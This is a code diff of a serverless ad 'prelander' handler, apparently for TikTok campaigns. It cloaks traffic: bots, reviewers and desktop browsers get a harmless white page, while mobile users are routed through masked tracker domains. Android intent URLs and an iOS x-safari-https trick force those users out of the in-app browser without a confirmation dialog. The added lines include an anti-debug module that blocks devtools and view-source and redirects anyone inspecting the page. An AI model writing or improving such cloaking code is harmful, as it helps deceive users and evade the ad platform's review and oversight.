@@ -3,10 +3,11 @@ export default function handler(req, res) {
   // Optimized Zero-Leak Hybrid Prelander & Hardware Gate
   // ===================================================================
 
-  const SAFE_PAGE = 'https://thispage.com/';
+  const SAFE_PAGE = 'https://tokrwd.co';
   
-  // HARDCODED CAMPAIGN URL: Erases plain-text tracker links from your TikTok ads
-  const TRACKER_BASE = 'https://enjoygamestoday.live';
+  // ✅ SECURE MASKED LINK: Pointing directly to your active Cloudflare Worker proxy domain
+  // including your explicit campaign hash so MaxConv routes the traffic correctly.
+  const TRACKER_BASE = 'https://appflowconnect.com';
 
   // --- SERVER-SIDE BOT DETECTION ---
   const ua = (req.headers['user-agent'] || '').toLowerCase();
@@ -46,7 +47,7 @@ export default function handler(req, res) {
     
     // Dynamically forward all incoming UTMs and structural parameters
     for (const [key, value] of Object.entries(req.query)) {
-      if (key !== 's1' && key !== 's2') {
+      if (key !== 's1' && key !== 's2' && key !== 'dest') {
         targetUrl.searchParams.set(key, Array.isArray(value) ? value[0] : value);
       }
     }
@@ -110,19 +111,21 @@ var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
 var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
 var _fired = false;
 
+// 🛡️ ANTI-DEBUG MODULE
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+document.onkeydown = function(e) {
+    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
+};
+setInterval(function() {
+    var t = performance.now(); debugger;
+    if (performance.now() - t > 100) { window.location.href = SAFE; }
+}, 1000);
+
 // CLIENT-SIDE HARDWARE VERIFICATION GATE
 function verifyHumanHardware() {
-    var ua = navigator.userAgent;
-    
-    // 1. Fail headless automation engines
     if (navigator.webdriver) return false;
-    
-    // 2. Fail if touch capabilities are completely absent
     if (navigator.maxTouchPoints === 0) return false;
-    
-    // 3. Fail desktop browsers trying to pretend they are mobile
     if (window.screen.width === window.screen.height) return false;
-    
     return true;
 }
 
@@ -130,7 +133,6 @@ function doBreakout(){
 if(_fired)return;
 _fired=true;
 
-// Fail-Safe: If verification fails, forcefully rewrite destination to White Page
 if (!verifyHumanHardware()) {
     window.location.href = SAFE;
     return;
@@ -143,37 +145,21 @@ if(isAndroid){
     url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
     try{(window.top||window).location.href=url;}
     catch(e){window.location.href=url;}
-    
-    // Fallback for Android if intent fails
-    setTimeout(function(){
-        if(!document.hidden){window.location.href=DEST;}
-    },3000);
+    setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },3000);
 } else {
-    // iOS STRATEGY: No automatic timers. Forces immediate execution via the tap gesture.
-    // This strips the "Open in Safari?" confirmation dialogue entirely.
     url=url.replace(/^https:\\/\\//,'x-safari-https://');
     window.location.href=url;
-    
-    // Fallback for iOS
-    setTimeout(function(){
-        if(!document.hidden){window.location.href=DEST;}
-    },3000);
+    setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },3000);
 }
 }
 
-// Android Auto-Fire Only (Safe inside Android TikTok WebView)
 if (/Android/i.test(navigator.userAgent)) {
     setTimeout(doBreakout, 1500);
 }
 
-// Explicit Click Target Handlers (Crucial for iOS execution smoothness)
 var btn=document.getElementById('ctaButton');
 btn.onclick=function(e){e.preventDefault();e.stopPropagation();doBreakout();};
-
-document.getElementById('fullTap').addEventListener('click',function(){
-doBreakout();
-},{once:true});
-
+document.getElementById('fullTap').addEventListener('click',function(){ doBreakout(); },{once:true});
 window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});
 
 })();
